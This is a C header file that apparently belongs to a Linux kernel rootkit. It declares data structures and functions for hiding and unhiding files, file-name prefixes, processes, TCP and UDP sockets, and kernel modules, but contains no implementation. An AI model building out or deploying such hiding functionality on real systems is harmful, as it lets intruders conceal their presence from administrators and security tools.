#ifndef CONTROL_HEADER
#define CONTROL_HEADER

#include "include.h"
/* list for hidden files (full path) */
struct file_names{
	char name[1024];
	struct list_head file_list;
};

/* list for hidden files (by prefix) */
struct fname_prefix{
	char name[32];
	struct list_head fname_list;
};

/* list for hidden processes (by pid) */
struct processes{
	pid_t pid;
	struct list_head process_list;
};

/* list for hidden tcp sockets (by port) */
struct tcp_socket{
	int port;
	struct list_head tcp_list;
	};

/* list for hidden udp sockets (by port) */
struct udp_socket{
	int port;
	struct list_head udp_list;
	};

/* list for hidden kernel modules (by module name) */
// TODO: think of a better way to store hidden modules
struct modules{
	char name[32];
	struct list_head module_list;
}; 



/*
 * Functions for adding and removing certain objects from hiding
 */

int
hide_file_name(char *name);

int
unhide_file_name(char *name);

int
hide_file_prefix(char *name);

int
unhide_file_prefix(char *name);

int
hide_process(pid_t pid);

int
unhide_process(pid_t pid);

int
hide_tcp_socket(int port);

int
unhide_tcp_socket(int port);

int
hide_udp_socket(int port);

int
unhide_udp_socket(int port);

int
hide_module(char *name);

int
unhide_module(char *name);


#endif
